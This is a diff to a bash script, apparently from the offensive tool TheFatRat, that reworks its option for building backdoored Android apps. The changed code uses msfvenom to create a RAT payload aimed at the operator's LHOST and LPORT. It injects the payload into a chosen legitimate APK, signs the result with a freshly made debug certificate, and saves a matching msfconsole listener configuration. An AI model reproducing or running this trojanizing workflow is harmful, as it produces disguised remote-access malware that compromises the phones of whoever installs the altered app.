@@ -22,7 +22,7 @@ okegreen='\033[92m'
 lightgreen='\e[1;32m'
 white='\e[1;37m'
 red='\e[1;31m'
-yellow='\e[1;33m'
+yellow='\e[0;33m'
 BlueF='\e[1;34m' #Biru
 RESET="\033[00m" #normal
 orange='\e[38;5;166m'
@@ -77,6 +77,7 @@ lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
 hostn=`host $publicip | awk '{print $5}'`
 list=$path/config/listeners
+log=$path/logs/apk-old.log
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -179,6 +180,8 @@ backdoor=`sed -n 16p $file`
 searchsploit=`sed -n 17p $file`
 aapt=`sed -n 11p $file`
 apktool=`sed -n 12p $file`
+keytool=`sed -n 7p $file`
+sign=`sed -n 5p $file`
 
 else
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
@@ -1678,32 +1681,78 @@ menu
 ;;
 
 "Use old Fatrat method")
-echo ""
+echo -e $okegreen ""
 spinlong
+
+#removing previous logs
+rm -rf $log >/dev/null 2>&1
+touch $log >/dev/null 2>&1
+
 outf="app_backdoored.apk"
 gboor2
-echo "Creating RAT payload with msfvenom"
 echo -e $okegreen ""
-$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/temp/payload.apk
-echo "Done !"
+echo "[*] Creating RAT payload with msfvenom"
+
+#Creating payload and storing info in logfile
+$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/temp/payload.apk >>$log /dev/null 2>&1
+
+#Checking if payload exists
+pld=$path/temp/payload.apk
+if [ -f "$pld" ]
+then
+echo "[✔] Done!"
+else
+echo -e $red ""
+echo "[x] There was an error in the creation of the payload . 
+Check log file at : $log"
+rm -rf temp/* > /dev/null 2>&1
+menu
+fi
 sleep 2
-echo "Starting the merging process of RAT with the APK you selected"
-echo ""
-ruby $apkembed $path/temp/app.apk
-echo ""
+echo "[*] Creating a Valid Certificate"
+
+#Creating certificate and storing info in logfile
+$keytool -genkey -v -keystore $path/temp/debug.keystore -storepass android -alias androiddebugkey -keypass android -dname "CN=Android Debug,O=Android,C=US" -keyalg RSA -keysize 2048 -validity 10000 >>$log 2>&1
+
+#Checking if certificate was created
+cert=$path/temp/debug.keystore
+if [ -f "$cert" ]
+then
+echo "[✔] Done!"
+else
+echo -e $red ""
+echo "[x] There was an error creating a valid certificate .
+Check log file at : $log"
+rm -rf temp/* > /dev/null 2>&1
+menu
+fi
 sleep 2
 
+echo "[*] Starting the merging process of RAT with the APK you selected"
+echo -e $okegreen ""
+
+#Starting the process of inserting the payload into original apk file 
+ruby $apkembed $path/temp/app.apk
+sleep 2
+
+echo -e $okegreen ""
+#Checking if backdoor apk was created succefully
 fiapk=$path/temp/app_backdoored.apk
 if [ -f "$fiapk" ]
 then
-echo -e $green "[*] Backdoor apk created sucefully"
+echo "[✔] Done!"
+sleep 1
+echo "[*] Signing your Rat APK"
+$sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/temp/app_backdoored.apk androiddebugkey >>$log 2>&1
+echo "[✔] Done!"
 else
-echo -e $red "[!] There was an error in the creation of your RAT APK file , the possible reasons are :
+echo $red ""
+echo "[x] There was an error in the creation of your RAT APK file , the possible reasons are :
 - The architecture of the file is not for android
 - The original APK is protected
-- It was not possible to inject the payload in the hook you selected (in this case select a different hook point)"
-echo -e $green ""
-rm -rf temp/* > /dev/null 2>&1
+- It was not possible to inject the payload in the hook you selected (in this case select a different hook point)
+Check log file at : $log"
+echo -e $okegreen ""
 read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
 menu
 fi
@@ -1714,28 +1763,58 @@ ren=`shuf -i 1-1000 -n 1`
 back=$path/backdoored/app_backdoored.apk
 if [ -f "$back" ]
 then
-mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk
-echo -e $yellow "FatRat Detected that you already had a previous created backdoor
+mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk >>$log 2>&1
+echo -e $yellow ""
+echo "[!] FatRat Detected that you already had a previous created backdoor
 file in ($path/backdoored/) with the name app_backdoored.apk ."
-echo -e $okegreen "FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk
+echo -e $okegreen ""
+echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
+
+# Moving apk backdoor to final destination
+mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+
+# Removing temp files
+rm -rf temp/* > /dev/null 2>&1
 else
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk
+
+
+# Moving apk backdoor to final destination
+mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+rm -rf temp/* > /dev/null 2>&1
 fi
 
 varopt="$path/backdoored/app_backdoored.apk"
 if [ ! -f $varopt ]; then
-    echo -e $red "[!] There was an error copying your Rat app to final destination"
+echo -e $red ""
+echo "[x] There was an error copying your Rat app to final destination .
+Check log file at : $log"
+rm -rf temp/* > /dev/null 2>&1
+echo -e $okegreen ""
     read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
 menu
 fi
 
-echo -e $yellow "Your payload has been successfully & signed and it is located at :
+echo -e $green ""
+echo "Your payload has been successfully & signed and it is located at :
  $path/backdoored/app_backdoored.apk"
 sleep 2
-echo -e $okegreen "Removing temporary files"
+echo -e $okegreen ""
+echo "[*] Removing temporary files"
 sleep 2
 rm -rf $path/temp/* >/dev/null 2>&1
+echo "[✔] Done!"
+zenity --question --text="`printf "Do you want to create a listener for this configuration \n to use in msfconsole in future ?"`"
+if [ $? = 0 ] ; then
+save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="myapk");
+svf=$path/config/listeners/$save.rc
+rm -rf $svf >/dev/null 2>&1
+echo "set PAYLOAD $payload" > $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit" >> $svf
+echo "exit -y" >> $svf
+echo -e $okegreen "Configuration file saved to $list/$save.rc"
+fi
 echo -e $okegreen ""
 read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
 echo
